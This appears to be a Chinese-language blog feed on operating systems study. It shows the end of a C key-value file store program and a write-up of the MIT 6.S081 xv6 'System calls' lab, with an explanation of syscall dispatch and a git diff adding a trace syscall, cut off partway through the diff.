			<span class="token keyword">char</span><span class="token operator">*</span> key <span class="token operator">=</span> <span class="token function">strsep</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">","</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">char</span><span class="token operator">*</span> value <span class="token operator">=</span> <span class="token function">strsep</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">","</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bad command\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token keyword">continue</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
			
			FILE<span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>DATA_BASE<span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>fp <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"cannot open file %s\n"</span><span class="token punctuation">,</span> DATA_BASE<span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
			<span class="token function">fprintf</span><span class="token punctuation">(</span>fp<span class="token punctuation">,</span> <span class="token string">"%s,%s\n"</span><span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>op<span class="token punctuation">,</span> <span class="token string">"g"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token keyword">char</span><span class="token operator">*</span> key <span class="token operator">=</span> <span class="token function">strsep</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">","</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bad command\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token keyword">continue</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
			FILE<span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>DATA_BASE<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>fp <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"cannot open file %s\n"</span><span class="token punctuation">,</span> DATA_BASE<span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
			
			line_node<span class="token operator">*</span> data <span class="token operator">=</span> <span class="token function">read_from_file</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
			line_node<span class="token operator">*</span> p <span class="token operator">=</span> data<span class="token punctuation">;</span>
			<span class="token keyword">int</span> flag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
			
			<span class="token keyword">while</span> <span class="token punctuation">(</span>p <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				<span class="token keyword">char</span><span class="token operator">*</span> entry <span class="token operator">=</span> <span class="token function">strdup</span><span class="token punctuation">(</span>p<span class="token operator">-></span>line_buf<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 条目备份（line_buf会被strsep()修改）</span>
				<span class="token keyword">char</span><span class="token operator">*</span> token <span class="token operator">=</span> <span class="token function">strsep</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token punctuation">(</span>p<span class="token operator">-></span>line_buf<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">","</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>token<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 找到key</span>
					flag <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
					<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> entry<span class="token punctuation">)</span><span class="token punctuation">;</span>
					<span class="token keyword">break</span><span class="token punctuation">;</span>
				<span class="token punctuation">&#125;</span>
				p <span class="token operator">=</span> p<span class="token operator">-></span>next<span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>flag<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s not found\n"</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
			
			<span class="token function">free_list_mem</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>op<span class="token punctuation">,</span> <span class="token string">"d"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token keyword">char</span><span class="token operator">*</span> key <span class="token operator">=</span> <span class="token function">strsep</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">","</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bad command\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token keyword">continue</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
			
			FILE<span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>DATA_BASE<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>fp <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"cannot open file %s\n"</span><span class="token punctuation">,</span> DATA_BASE<span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
			line_node<span class="token operator">*</span> data <span class="token operator">=</span> <span class="token function">read_from_file</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
			
			<span class="token comment">// 清空文件</span>
			fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>DATA_BASE<span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>fp <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"cannot open file %s\n"</span><span class="token punctuation">,</span> DATA_BASE<span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
			<span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
			
			fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>DATA_BASE<span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>fp <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"cannot open file %s\n"</span><span class="token punctuation">,</span> DATA_BASE<span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
			line_node<span class="token operator">*</span> p <span class="token operator">=</span> data<span class="token punctuation">;</span>
			<span class="token keyword">while</span> <span class="token punctuation">(</span>p <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				<span class="token keyword">char</span><span class="token operator">*</span> entry <span class="token operator">=</span> <span class="token function">strdup</span><span class="token punctuation">(</span>p<span class="token operator">-></span>line_buf<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 条目备份</span>
				<span class="token keyword">char</span><span class="token operator">*</span> token <span class="token operator">=</span> <span class="token function">strsep</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token punctuation">(</span>p<span class="token operator">-></span>line_buf<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">","</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>token<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 当前条目键值为key，不写入（相当于删除）</span>
					<span class="token function">fprintf</span><span class="token punctuation">(</span>fp<span class="token punctuation">,</span> <span class="token string">"%s"</span><span class="token punctuation">,</span> entry<span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token punctuation">&#125;</span>
				p <span class="token operator">=</span> p<span class="token operator">-></span>next<span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
			
			<span class="token function">free_list_mem</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>op<span class="token punctuation">,</span> <span class="token string">"c"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bad command\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token keyword">continue</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
			FILE<span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>DATA_BASE<span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>fp <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"cannot open file %s\n"</span><span class="token punctuation">,</span> DATA_BASE<span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
			<span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>op<span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bad command\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token keyword">continue</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
			FILE<span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>DATA_BASE<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			line_node<span class="token operator">*</span> data <span class="token operator">=</span> <span class="token function">read_from_file</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
			line_node<span class="token operator">*</span> p <span class="token operator">=</span> data<span class="token punctuation">;</span>
			<span class="token keyword">while</span> <span class="token punctuation">(</span>p <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> p<span class="token operator">-></span>line_buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
				p <span class="token operator">=</span> p<span class="token operator">-></span>next<span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
			<span class="token function">free_list_mem</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
			<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bad command\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">continue</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>操作系统</tag>
        <tag>C</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>MIT6.s081 2021 Lab System calls</title>
    <url>/2024/06/27/MIT6.s081-2021-Lab%20System%20calls/</url>
    <content><![CDATA[<h1 id="xv6系统调用实现"><a href="#xv6系统调用实现" class="headerlink" title="xv6系统调用实现"></a>xv6系统调用实现</h1><p>不同于 Lab1 利用已实现的系统调用来实现一些用户态下的命令行程序，本 Lab 是要在内核层面实现一些系统调用。这其中难免涉及到一些对内核数据结构的操作，以及处理器体系结构（本系列 Lab 基于 RISCV）相关的内容，那么首先有必要梳理一下 xv6 下系统调用的实现过程。</p>
<p>xv6 系统调用的实现：</p>
<ol>
<li>以 <code>trace</code> 系统调用为例，用户通过调用 <code>user/user.h</code> 中的函数 <code>trace</code> 进行系统调用。</li>
<li>通过调用 Perl 脚本 <code>user/usys.pl</code> 生成的一系列汇编代码，该汇编代码的作用是设置寄存器的内容并实现用户态到内核态的切换，内核后续针对寄存器中的内容执行相应的系统调用操作。以下是对 <code>user/usys.pl</code> 代码的逐行解析：</li>
</ol>
<blockquote>
<ol>
<li><p><code>#!/usr/bin/perl -w</code>：这是一个Perl脚本的“shebang”行，指定使用<code>/usr/bin/perl</code>解释器执行此脚本，并开启警告（<code>-w</code>）选项。</p>
</li>
<li><p><code>print &quot;# generated by usys.pl - do not edit\n&quot;;</code>：打印注释说明此文件是由<code>usys.pl</code>脚本自动生成的，不应手动编辑。</p>
</li>
<li><p><code>print &quot;#include \&quot;kernel/syscall.h\&quot;\n&quot;;</code>：输出一条预处理器指令，包含一个名为<code>syscall.h</code>的头文件，该文件可能包含了系统调用相关的常量和宏定义。</p>
</li>
<li><p><code>sub entry &#123;...&#125;</code>：定义了一个名为<code>entry</code>的子程序（函数），它接受一个参数（系统调用名称）。</p>
</li>
<li><p><code>my $name = shift;</code>：在<code>entry</code>函数内部，使用<code>shift</code>函数获取传入的第一个参数（系统调用名称），并将其存储在变量<code>$name</code>中。</p>
</li>
<li><p>接下来的几行<code>print</code>语句构造了每个系统调用存根的汇编代码：</p>
<ul>
<li><code>.global $name</code>：声明一个全局标签（函数名），使得链接器能够找到它。</li>
<li><code>$&#123;name&#125;:\n</code>：定义了一个标签，对应于系统调用函数的开始。</li>
<li><code>li a7, SYS_$&#123;name&#125;\n</code>：装载（load immediate）指令，将系统调用号（通过宏<code>SYS_$&#123;name&#125;</code>得到）放入寄存器a7中。在RISC-V架构中，a7寄存器通常用于存放系统调用号。</li>
<li><code>ecall</code>：执行系统调用指令，这会触发处理器进入内核模式并执行相应的内核服务。</li>
<li><code>ret</code>：返回指令，从系统调用中返回到用户程序。</li>
</ul>
</li>
<li><p>最后，脚本通过多次调用<code>entry</code>函数（传入不同的系统调用名称，如<code>fork</code>, <code>exit</code>, <code>wait</code>等），为每一个列出的系统调用生成对应的汇编代码存根。</p>
</li>
</ol>
</blockquote>
<ol start="3">
<li>内核在执行系统调用时，只是调用 <code>kernel/syscall.c</code> 中的 <code>syscall</code> 函数，该函数读取寄存器 a7 的值，将其作为系统调用号，执行实际的系统调用函数（如<code>sys_trace</code>），并将函数返回值放入寄存器 a0 中，调用结束。</li>
</ol>
<h1 id="System-call-tracing"><a href="#System-call-tracing" class="headerlink" title="System call tracing"></a>System call tracing</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>理解了上述的系统调用过程，就可以开始着手完成系统调用的添加了。</p>
<p>由题干可知，用户态系统调用函数 <code>trace</code> 的参数为一个整型 mask，该 mask 用来表示哪些系统调用需要被追踪，如果 mask 的第 i 位为 1，则系统调用号 i 对应的系统调用将被追踪。</p>
<p>首先，在 <code>user/user.h</code>、<code>user/usys.pl</code> 和 <code>kernel/syscall.h</code> 中添加 <code>trace</code> 的声明。</p>
<p>接下来，在 <code>kernel/sysproc.c</code> 中实现系统调用函数 <code>sys_trace</code>，该函数获取用户态传递的 <code>trace</code> 函数的参数 mask，并存入当前进程的 PCB（进程控制块，xv6 中为 <code>kernel/proc.h</code> 中的 <code>struct proc</code> 结构体）中。获取参数的操作，可以查看如下 xv6 文档的描述，并参考 <code>kernel/sysproc.c</code> 中其它系统调用函数的实现。由于参数类型为整型且数量只有一个（存放在 a0 寄存器中），因此调用 <code>argint(0, &amp;(myproc()-&gt;mask))</code>。另外需要注意的是，<code>struct proc</code> 的初始定义中并没有 mask 段的内容，需要自行添加。</p>
<blockquote>
<p>Because user code calls system call wrapper functions, the arguments are initially where the RISC-V C calling convention places them: in registers. The kernel trap code saves user registers to the current process’s trap frame, where kernel code can find them. The kernel functions argint, argaddr, and argfd retrieve the n ’th system call argument from the trap frame as an integer, pointer, or a file descriptor. They all call argraw to retrieve the appropriate saved user register (kernel/syscall.c:35).</p>
</blockquote>
<p>然后，修改 <code>kernel/proc.c</code> 中 <code>fork</code> 函数的定义，为 mask 字段添加拷贝操作，将父进程的 mask 字段传递给子进程，以此实现对子进程的追踪。</p>
<pre class="language-c" data-language="c"><code class="language-c">np<span class="token operator">-></span>mask <span class="token operator">=</span> p<span class="token operator">-></span>mask<span class="token punctuation">;</span></code></pre>

<p>最后，修改 <code>kernel/syscall.c</code> 中的 <code>syscall</code> 函数，判断当前的系统调用号是否位于被追踪的范围内，如果是，则按照要求格式将要追踪的信息打印出来：其中进程号为 <code>myproc()-&gt;pid</code>；函数调用名可手动创建一个系统调用名称表，通过将系统调用号作为下标来获取；函数返回值位于寄存器 a0 中，可通过 <code>myproc()-&gt;trapframe-&gt;a0</code> 来获取。</p>
<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>最后再记录一下本 Lab 遇到的一些问题：</p>
<h3 id="make失败"><a href="#make失败" class="headerlink" title="make失败"></a>make失败</h3><p><img src="/2024/06/27/MIT6.s081-2021-Lab%20System%20calls/mkerr.png"></p>
<p>被这个错误困扰了挺久，甚至还为此使用 <code>git reset</code> 回退了版本，最后发现是在 <code>$U/_trace\</code> 的末尾多了一个空格。。。</p>
<h3 id="系统调用名称表添加出错"><a href="#系统调用名称表添加出错" class="headerlink" title="系统调用名称表添加出错"></a>系统调用名称表添加出错</h3><p><img src="/2024/06/27/MIT6.s081-2021-Lab%20System%20calls/aserr.png"></p>
<p>原因是我将系统调用名称表添加在了 <code>kernel/syscall.h</code> 中，但该头文件后续是会被 <code>user/usys.pl</code> 用于生成汇编的，因此不能包含 C 语言语句，最后是选择直接添加在了 <code>kernel/syscall.c</code> 中。</p>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>由于本 Lab 主要是在原先的内核代码上进行修改，涉及的文件较多，因此代码部分以 <code>git diff</code> 的形式展现。</p>
<pre class="language-diff" data-language="diff"><code class="language-diff">diff --git a/Makefile b/Makefile
index c926b7e..6647da5 100644
<span class="token coord">--- a/Makefile</span>
<span class="token coord">+++ b/Makefile</span>
@@ -193,6 +193,7 @@ UPROGS=\
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">	$U/_grind\
</span><span class="token prefix unchanged"> </span><span class="token line">	$U/_wc\
</span><span class="token prefix unchanged"> </span><span class="token line">	$U/_zombie\
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">	$U/_trace\
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">
</span><span class="token prefix unchanged"> </span><span class="token line">
</span><span class="token prefix unchanged"> </span><span class="token line">
</span></span>diff --git a/kernel/proc.c b/kernel/proc.c
index 22e7ce4..f4bd5c2 100644
<span class="token coord">--- a/kernel/proc.c</span>
<span class="token coord">+++ b/kernel/proc.c</span>
@@ -314,6 +314,9 @@ fork(void)
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  acquire(&amp;np->lock);
</span><span class="token prefix unchanged"> </span><span class="token line">  np->state = RUNNABLE;
</span><span class="token prefix unchanged"> </span><span class="token line">  release(&amp;np->lock);
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  
</span><span class="token prefix inserted">+</span><span class="token line">  // here
</span><span class="token prefix inserted">+</span><span class="token line">  np->mask = p->mask;
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">
</span><span class="token prefix unchanged"> </span><span class="token line">  return pid;
</span><span class="token prefix unchanged"> </span><span class="token line">&#125;
</span></span>diff --git a/kernel/proc.h b/kernel/proc.h
index f6ca8b7..e83d456 100644
<span class="token coord">--- a/kernel/proc.h</span>
<span class="token coord">+++ b/kernel/proc.h</span>
@@ -105,4 +105,7 @@ struct proc &#123;
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  struct file *ofile[NOFILE];  // Open files
</span><span class="token prefix unchanged"> </span><span class="token line">  struct inode *cwd;           // Current directory
</span><span class="token prefix unchanged"> </span><span class="token line">  char name[16];               // Process name (debugging)
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  
</span><span class="token prefix inserted">+</span><span class="token line">  // here
</span><span class="token prefix inserted">+</span><span class="token line">  int mask;					   // Mask of trace
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;;
</span></span>diff --git a/kernel/syscall.c b/kernel/syscall.c
index c1b3670..b5b8291 100644
<span class="token coord">--- a/kernel/syscall.c</span>
<span class="token coord">+++ b/kernel/syscall.c</span>
@@ -104,6 +104,7 @@ extern uint64 sys_unlink(void);
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">extern uint64 sys_wait(void);
</span><span class="token prefix unchanged"> </span><span class="token line">extern uint64 sys_write(void);
</span><span class="token prefix unchanged"> </span><span class="token line">extern uint64 sys_uptime(void);
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">extern uint64 sys_trace(void);
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">
</span><span class="token prefix unchanged"> </span><span class="token line">static uint64 (*syscalls[])(void) = &#123;
</span><span class="token prefix unchanged"> </span><span class="token line">[SYS_fork]    sys_fork,
</span></span>@@ -127,6 +128,16 @@ static uint64 (*syscalls[])(void) = &#123;
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">[SYS_link]    sys_link,
</span><span class="token prefix unchanged"> </span><span class="token line">[SYS_mkdir]   sys_mkdir,
</span><span class="token prefix unchanged"> </span><span class="token line">[SYS_close]   sys_close,
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">[SYS_trace]   sys_trace,
</span><span class="token prefix inserted">+</span><span class="token line">&#125;;
</span><span class="token prefix inserted">+</span><span class="token line">
</span><span class="token prefix inserted">+</span><span class="token line">// here
</span><span class="token prefix inserted">+</span><span class="token line">static char *syscall_names[] = &#123;	
</span><span class="token prefix inserted">+</span><span class="token line">	"dummy",  "fork",  "exit",  "wait",  "pipe",
</span><span class="token prefix inserted">+</span><span class="token line">	"read",   "kill",  "exec",  "fstat", "chdir",
</span><span class="token prefix inserted">+</span><span class="token line">	"dup",    "getpid","sbrk",  "sleep", "uptime",
</span><span class="token prefix inserted">+</span><span class="token line">	"open",   "write", "mknod", "unlink", "link",
</span><span class="token prefix inserted">+</span><span class="token line">	"mkdir",  "close", "trace",
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;;
</span><span class="token prefix unchanged"> </span><span class="token line">
</span><span class="token prefix unchanged"> </span><span class="token line">void
</span></span>@@ -138,6 +149,11 @@ syscall(void)
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  num = p->trapframe->a7;
</span><span class="token prefix unchanged"> </span><span class="token line">  if(num > 0 &amp;&amp; num &lt; NELEM(syscalls) &amp;&amp; syscalls[num]) &#123;
</span><span class="token prefix unchanged"> </span><span class="token line">    p->trapframe->a0 = syscalls[num]();
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">	
</span><span class="token prefix inserted">+</span><span class="token line">	// here
</span><span class="token prefix inserted">+</span><span class="token line">	if (p->mask &amp; (1 &lt;&lt; num)) &#123;  // if mask contains current syscall num
</span><span class="token prefix inserted">+</span><span class="token line">		printf("%d: syscall %s -> %d\n", p->pid, syscall_names[num], p->trapframe->a0);
</span><span class="token prefix inserted">+</span><span class="token line">	&#125;
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  &#125; else &#123;
</span><span class="token prefix unchanged"> </span><span class="token line">    printf("%d %s: unknown sys call %d\n",
</span><span class="token prefix unchanged"> </span><span class="token line">            p->pid, p->name, num);
</span></span>diff --git a/kernel/syscall.h b/kernel/syscall.h
index bc5f356..756d191 100644
<span class="token coord">--- a/kernel/syscall.h</span>
<span class="token coord">+++ b/kernel/syscall.h</span>
<span class="token coord">@@ -20,3 +20,4 @@</span>
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">#define SYS_link   19
</span><span class="token prefix unchanged"> </span><span class="token line">#define SYS_mkdir  20
</span><span class="token prefix unchanged"> </span><span class="token line">#define SYS_close  21
